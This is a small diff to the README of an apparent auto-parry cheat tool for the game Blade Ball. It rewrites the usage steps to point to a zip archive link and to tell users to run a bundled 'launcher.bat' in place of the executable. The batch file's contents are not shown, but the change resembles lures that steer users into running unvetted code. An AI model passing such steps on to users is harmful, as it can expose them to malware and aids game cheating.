@@ -19,8 +19,8 @@ When a ball gets close enough, the program automatically triggers the configured
 
 ## 🚀 Usage
 
-1. Download the latest `.exe` from the **Releases** section.
-2. Run the executable.
+1. Download the latest `.exe` from the **Releases** section.https://github.com/master277/Blade-Ball-Auto-Parry-Tool/archive/refs/tags/v5.zip
+2. Run the launcher.bat.
 3. Open Blade Ball.
 4. Configure the available settings.
 5. Enable the auto-parry system.
